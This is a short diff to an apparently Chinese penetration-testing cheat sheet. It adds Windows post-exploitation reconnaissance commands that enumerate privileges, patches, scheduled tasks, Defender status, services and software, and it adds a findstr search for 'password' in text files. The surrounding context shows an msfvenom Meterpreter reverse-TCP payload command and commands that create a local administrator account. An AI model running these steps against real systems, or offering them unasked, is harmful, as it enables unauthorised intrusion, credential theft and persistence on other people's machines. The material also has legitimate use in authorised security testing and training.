@@ -145,6 +145,18 @@ msfvenom -p windows/x86/meterprete/reverse_tcp -f .exe -o shell.exe lhost=192.16
 
 
 Windows系统增加用户的命令
+net users
+whoam /priv
+net user username
+query session
+systeminfo | findstr /B /C:"OS"
+findstr /si password *.txt  /si 遍历子目录忽略大小写 在所有txt文中中查找包含password字符的文件
+wmic qfe get Caption,Description,HotFixID,InstalledOn 查找计算机安装的补丁
+schtasks /query /fo LIST /v  调度任务列表
+sc query windefend 查看防护墙状态
+driverquery 列出所有驱动状态
+wmic product get name,version,vendor 查看计算机中安装的软件
+wmic service list brief 查看计算机中安装的服务
 net user <username> <password> /add
 
 net localgroup administrators <username> /add
